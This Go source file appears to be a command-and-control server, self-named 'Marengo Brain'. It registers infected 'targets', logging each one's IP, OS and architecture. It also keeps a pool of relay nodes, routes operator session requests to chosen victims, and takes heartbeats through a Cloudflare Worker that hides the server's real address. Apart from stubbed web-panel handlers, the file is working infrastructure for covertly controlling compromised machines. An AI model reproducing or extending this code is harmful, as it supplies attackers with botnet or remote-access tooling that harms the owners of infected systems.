package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"sync"
	"time"
)

// --- DATA STRUCTURES ---
type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
	Listen   string `json:"listen"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

var (
	relayPoolMap   = make(map[string]time.Time)
	relayMetadata  = make(map[string]time.Time)
	activeSessions = make(map[string]string)
	activeTargets  = make(map[string]string)
	lastSeen       = make(map[string]time.Time)
	trafficCount   = make(map[string]int)
	publicIPs      = make(map[string]string)
	nodeOS         = make(map[string]string)
	nodeArch       = make(map[string]string)
	eventLog       []string
	mu             sync.Mutex
	startTime      = time.Now()
)

const (
	dbFile      = "infra_db.json"
	sessionFile = "sessions_db.json"
)

// --- LOGGING (Safe Version) ---
func addLogInternal(msg string) {
	ts := time.Now().Format("15:04:05")
	eventLog = append([]string{"[" + ts + "] " + msg}, eventLog...)
	if len(eventLog) > 20 {
		eventLog = eventLog[:20]
	}
}

// --- PERSISTENCE ---
func saveState() {
	relays := make([]string, 0, len(relayPoolMap))
	for k := range relayPoolMap {
		relays = append(relays, k)
	}
	rData, _ := json.Marshal(relays)
	os.WriteFile(dbFile, rData, 0644)
	sData, _ := json.Marshal(activeSessions)
	os.WriteFile(sessionFile, sData, 0644)
}

func loadState() {
	mu.Lock()
	defer mu.Unlock()
	if rData, err := os.ReadFile(dbFile); err == nil {
		var keys []string
		json.Unmarshal(rData, &keys)
		for _, k := range keys {
			relayPoolMap[k] = time.Now()
			relayMetadata[k] = time.Now()
		}
	}
	if sData, err := os.ReadFile(sessionFile); err == nil {
		json.Unmarshal(sData, &activeSessions)
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	loadState()

	// --- 1. THE GLOBAL REAPER ---
	go func() {
		for {
			time.Sleep(10 * time.Second)
			mu.Lock()
			for id, t := range lastSeen {
				if time.Since(t) > 60*time.Second {
					addLogInternal("TIMEOUT: Purging node " + id)
					delete(lastSeen, id)
					delete(activeTargets, id)
					delete(publicIPs, id)
					delete(nodeOS, id)
					delete(nodeArch, id)
					delete(activeSessions, id)
				}
			}
			for addr, t := range relayPoolMap {
				if time.Since(t) > 45*time.Second {
					delete(relayPoolMap, addr)
					delete(relayMetadata, addr)
				}
			}
			mu.Unlock()
		}
	}()

	// Start the Analysis Panel UI and the Worker Bridge API
	go startAnalysisPanel()

	// 2. THE LEGACY TCP LISTENER (For Middle Relays and Direct CC Links)
	ln, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Println("[!] Listen Error:", err)
		return
	}

	fmt.Println("[*] Marengo Brain Online: Port 8080 (TCP/Relay)")
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleConnection(conn)
	}
}

// handleConnection processes raw TCP traffic (Relays, CC, and Legacy Ghosts)
func handleConnection(conn net.Conn) {
	defer conn.Close()
	var req AuthRequest
	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	if err := json.NewDecoder(conn).Decode(&req); err != nil {
		return
	}
	processPayload(req, ip)

	// Handle responses for TCP polling
	if req.Type == "cc_list" {
		mu.Lock()
		t := make([]string, 0)
		for tid, ts := range lastSeen {
			if time.Since(ts) < 60*time.Second {
				t = append(t, tid)
			}
		}
		mu.Unlock()
		json.NewEncoder(conn).Encode(t)
	} else if req.Type == "cc_req" || req.Type == "client_poll" {
		mu.Lock()
		addr := activeSessions[req.TargetID]
		if addr != "" {
			delete(activeSessions, req.TargetID)
			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: addr})
		} else {
			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: ""})
		}
		mu.Unlock()
	}
}

// processPayload handles the shared logic for both TCP and HTTP/Worker requests
func processPayload(req AuthRequest, ip string) interface{} {
	mu.Lock()
	defer mu.Unlock()

	id := req.TargetID
	if id != "" {
		trafficCount[id]++
	}

	switch req.Type {
	case "middle":
		relayPoolMap[req.Listen] = time.Now()
		if _, exists := relayMetadata[req.Listen]; !exists {
			relayMetadata[req.Listen] = time.Now()
		}
		go saveState()

	case "client_register":
		activeTargets[id] = req.Key
		lastSeen[id] = time.Now()
		publicIPs[id] = ip
		nodeOS[id] = req.OS
		nodeArch[id] = req.Arch
		addLogInternal("REGISTER: " + id + " (" + req.OS + ")")

	case "client_poll":
		lastSeen[id] = time.Now()
		publicIPs[id] = ip
		addr := activeSessions[id]
		if addr != "" {
			publicIPs[id+"_relay"] = addr
			delete(activeSessions, id)
			return RoutingInfo{RelayAddr: addr}
		}
	}
	return RoutingInfo{RelayAddr: ""}
}

func startAnalysisPanel() {
	// --- NEW: THE WORKER BRIDGE API ---
	// This endpoint receives heartbeats from the Cloudflare Worker
	http.HandleFunc("/api/bridge", func(w http.ResponseWriter, r *http.Request) {
		// Extract Real IP from Cloudflare Forwarding Header
		realIP := r.Header.Get("X-Forwarded-For")
		if realIP == "" {
			realIP, _, _ = net.SplitHostPort(r.RemoteAddr)
		}

		var req AuthRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "Bad Request", http.StatusBadRequest)
			return
		}

		// Use the shared processing logic
		result := processPayload(req, realIP)

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(result)
	})

	// Legacy Panel Endpoints...
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// [Keep your existing HTML/JS code here]
	})

	http.HandleFunc("/api/metrics", func(w http.ResponseWriter, r *http.Request) {
		// [Keep your existing metrics logic here]
	})

	fmt.Println("[*] Analysis Panel & Worker API Online: Port 9000")
	http.ListenAndServe(":9000", nil)
}
